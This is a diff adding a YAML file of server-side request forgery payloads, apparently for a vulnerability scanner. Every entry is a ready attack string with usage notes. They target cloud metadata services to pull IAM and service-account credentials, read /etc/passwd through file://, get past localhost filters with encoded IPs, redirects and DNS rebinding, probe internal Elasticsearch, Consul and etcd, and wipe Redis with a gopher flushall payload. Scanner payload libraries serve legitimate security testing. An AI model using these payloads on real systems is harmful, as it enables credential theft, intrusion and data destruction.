@@ -1,0 +1,351 @@
+defaults:
+  vuln_type: ssrf
+  encoding: raw
+  source: ensphere
+
+payloads:
+  # Cloud metadata — AWS
+  - technique: metadata_access
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    payload: "http://169.254.169.254/latest/meta-data/"
+    notes: "AWS EC2 metadata endpoint. Response contains instance-id, ami-id, etc."
+    tags: [aws, metadata, cloud]
+
+  - technique: metadata_access
+    injection_surface: query
+    evidence_type: content_match
+    risk: 4
+    payload: "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+    notes: "AWS IAM role credentials. Lists available roles; append role name for temp creds."
+    tags: [aws, iam, credentials, cloud]
+
+  # Cloud metadata — GCP
+  - technique: metadata_access
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    payload: "http://metadata.google.internal/computeMetadata/v1/instance/"
+    notes: "GCP metadata. Requires Metadata-Flavor: Google header — test if server adds it."
+    tags: [gcp, metadata, cloud]
+
+  - technique: metadata_access
+    injection_surface: query
+    evidence_type: content_match
+    risk: 4
+    payload: "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
+    notes: "GCP service account token. High impact if server auto-adds required header."
+    tags: [gcp, credentials, cloud]
+
+  # Cloud metadata — Azure
+  - technique: metadata_access
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    payload: "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
+    notes: "Azure IMDS. Requires Metadata: true header — test if server adds it."
+    tags: [azure, metadata, cloud]
+
+  # Localhost probes — direct
+  - technique: internal_service
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "http://127.0.0.1/"
+    notes: "Basic localhost probe. Compare response size/timing to external URL."
+    tags: [localhost, probe]
+
+  - technique: internal_service
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "http://localhost/"
+    notes: "Hostname-based localhost. May bypass IP-based blocklists."
+    tags: [localhost, probe, bypass]
+
+  # Localhost probes — bypass variants
+  - technique: internal_service
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "http://0.0.0.0/"
+    notes: "0.0.0.0 often resolves to localhost. Bypasses naive 127.0.0.1 blocklists."
+    tags: [localhost, bypass]
+
+  - technique: internal_service
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "http://[::1]/"
+    notes: "IPv6 loopback. Bypasses IPv4-only blocklists."
+    tags: [localhost, ipv6, bypass]
+
+  - technique: internal_service
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "http://0x7f000001/"
+    notes: "Hex-encoded 127.0.0.1. Bypasses string-based IP checks."
+    tags: [localhost, hex, bypass]
+
+  - technique: internal_service
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "http://2130706433/"
+    notes: "Decimal-encoded 127.0.0.1. Bypasses regex-based IP filters."
+    tags: [localhost, decimal, bypass]
+
+  - technique: internal_service
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "http://127.1/"
+    notes: "Short form 127.0.0.1. Some URL parsers normalize this to localhost."
+    tags: [localhost, shortform, bypass]
+
+  # Protocol smuggling
+  - technique: protocol_smuggling
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    payload: "file:///etc/passwd"
+    notes: "File protocol. If server follows file:// URIs, reads local filesystem."
+    tags: [file_protocol, lfi]
+
+  - technique: protocol_smuggling
+    injection_surface: query
+    evidence_type: dns_hit
+    risk: 2
+    payload: "http://COLLAB_DOMAIN/"
+    placeholders: [COLLAB_DOMAIN]
+    notes: "DNS-based SSRF detection. Use Burp Collaborator or Interactsh domain."
+    tags: [oob, dns, blind]
+
+  # Port scanning
+  - technique: port_scan
+    injection_surface: query
+    evidence_type: timing
+    risk: 2
+    payload: "http://127.0.0.1:PORT/"
+    placeholders: [PORT]
+    notes: "Internal port scan. Compare response timing/errors across ports (22, 3306, 5432, 6379, 8080)."
+    tags: [port_scan, recon]
+
+  - technique: port_scan
+    injection_surface: query
+    evidence_type: timing
+    risk: 2
+    payload: "http://127.0.0.1:6379/"
+    notes: "Redis probe (port 6379). If accessible, response differs from closed port."
+    tags: [port_scan, redis]
+
+  # === EXPANSION: Redirect-based SSRF ===
+  - technique: internal_service
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    payload: "http://COLLAB_DOMAIN/redirect?url=http://169.254.169.254/latest/meta-data/"
+    placeholders: [COLLAB_DOMAIN]
+    notes: "Redirect chain to AWS metadata. Host a 302 redirect on your domain."
+    tags: [redirect, aws, metadata, bypass]
+
+  - technique: internal_service
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    payload: "http://COLLAB_DOMAIN/redirect?url=http://127.0.0.1/"
+    placeholders: [COLLAB_DOMAIN]
+    notes: "Redirect chain to localhost. Bypasses URL validation that checks initial host."
+    tags: [redirect, localhost, bypass]
+
+  # === EXPANSION: DNS rebinding ===
+  - technique: internal_service
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    payload: "http://DNS_REBIND_DOMAIN/"
+    placeholders: [DNS_REBIND_DOMAIN]
+    notes: "DNS rebinding attack. Use a service like rbndr.us that alternates between external and 127.0.0.1."
+    tags: [dns_rebind, bypass]
+
+  # === EXPANSION: IPv6 expanded ===
+  - technique: internal_service
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "http://[0:0:0:0:0:0:0:1]/"
+    notes: "Full IPv6 loopback address."
+    tags: [localhost, ipv6, expanded, bypass]
+
+  - technique: internal_service
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "http://[0000:0000:0000:0000:0000:0000:0000:0001]/"
+    notes: "Zero-padded full IPv6 loopback."
+    tags: [localhost, ipv6, zero_padded, bypass]
+
+  - technique: internal_service
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "http://[::ffff:127.0.0.1]/"
+    notes: "IPv4-mapped IPv6 address for 127.0.0.1."
+    tags: [localhost, ipv6, mapped, bypass]
+
+  # === EXPANSION: Octal/mixed IP encoding ===
+  - technique: internal_service
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "http://0177.0.0.1/"
+    notes: "Octal-encoded 127.0.0.1. Some parsers interpret leading 0 as octal."
+    tags: [localhost, octal, bypass]
+
+  - technique: internal_service
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "http://0x7f.0.0.1/"
+    notes: "Mixed hex/decimal encoding. First octet in hex."
+    tags: [localhost, mixed_encoding, bypass]
+
+  # === EXPANSION: URL-encoded variants ===
+  - technique: internal_service
+    injection_surface: query
+    encoding: url
+    evidence_type: content_match
+    risk: 2
+    payload: "http%3A%2F%2F127.0.0.1%2F"
+    notes: "URL-encoded SSRF to localhost."
+    tags: [localhost, url_encoded]
+
+  - technique: internal_service
+    injection_surface: query
+    encoding: double_url
+    evidence_type: content_match
+    risk: 2
+    payload: "http%253A%252F%252F127.0.0.1%252F"
+    notes: "Double URL-encoded SSRF. Bypasses single-decode validation."
+    tags: [localhost, double_url_encoded, bypass]
+
+  # === EXPANSION: Cloud metadata alternative paths ===
+  - technique: metadata_access
+    injection_surface: query
+    evidence_type: content_match
+    risk: 4
+    payload: "http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME"
+    placeholders: [ROLE_NAME]
+    notes: "Fetch actual IAM temp credentials. Append role name from listing endpoint."
+    tags: [aws, iam, credentials, cloud]
+
+  - technique: metadata_access
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    payload: "http://169.254.169.254/latest/user-data"
+    notes: "AWS user-data. May contain startup scripts with secrets."
+    tags: [aws, user_data, cloud]
+
+  - technique: metadata_access
+    injection_surface: query
+    evidence_type: content_match
+    risk: 4
+    payload: "http://169.254.169.254/latest/api/token"
+    notes: "AWS IMDSv2 token endpoint. PUT request required. If GET works, IMDSv1 is enabled."
+    tags: [aws, imdsv2, token, cloud]
+
+  # === EXPANSION: Internal services ===
+  - technique: internal_service
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    payload: "http://127.0.0.1:9200/"
+    notes: "Elasticsearch probe. Returns cluster info JSON if accessible."
+    tags: [internal_service, elasticsearch]
+
+  - technique: internal_service
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    payload: "http://127.0.0.1:9200/_cat/indices"
+    notes: "Elasticsearch index listing."
+    tags: [internal_service, elasticsearch, indices]
+
+  - technique: internal_service
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    payload: "http://127.0.0.1:8500/v1/agent/members"
+    notes: "Consul agent members endpoint."
+    tags: [internal_service, consul]
+
+  - technique: internal_service
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    payload: "http://127.0.0.1:2379/v2/keys/"
+    notes: "etcd key listing."
+    tags: [internal_service, etcd]
+
+  - technique: internal_service
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    payload: "http://127.0.0.1:8080/metrics"
+    notes: "Prometheus metrics endpoint. May expose internal service info."
+    tags: [internal_service, prometheus, metrics]
+
+  # === EXPANSION: JSON body SSRF ===
+  - technique: internal_service
+    injection_surface: json_body
+    evidence_type: content_match
+    risk: 2
+    payload: "http://127.0.0.1/"
+    notes: "SSRF via JSON body URL field (webhook_url, callback, image_url, etc.)."
+    tags: [localhost, json]
+
+  - technique: metadata_access
+    injection_surface: json_body
+    evidence_type: content_match
+    risk: 3
+    payload: "http://169.254.169.254/latest/meta-data/"
+    notes: "AWS metadata via JSON body URL field."
+    tags: [aws, metadata, json]
+
+  # === EXPANSION: Header-based SSRF ===
+  - technique: internal_service
+    injection_surface: header
+    evidence_type: content_match
+    risk: 2
+    payload: "http://127.0.0.1/"
+    notes: "SSRF via header (Referer, X-Forwarded-For, X-Original-URL)."
+    tags: [localhost, header]
+
+  # === EXPANSION: Gopher protocol ===
+  - technique: protocol_smuggling
+    injection_surface: query
+    evidence_type: content_match
+    risk: 4
+    payload: "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a"
+    notes: "Gopher protocol SSRF to Redis. Send raw Redis commands. HIGH RISK — flushall example."
+    tags: [gopher, redis, protocol, destructive]
+
+  - technique: protocol_smuggling
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    payload: "gopher://127.0.0.1:6379/_INFO%0d%0a"
+    notes: "Gopher to Redis INFO command. Safe probe for Redis access."
+    tags: [gopher, redis, info, safe]
+
+  # === EXPANSION: Dict protocol ===
+  - technique: protocol_smuggling
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "dict://127.0.0.1:6379/INFO"
+    notes: "Dict protocol to Redis. Alternative to gopher for command execution."
+    tags: [dict, redis, probe]
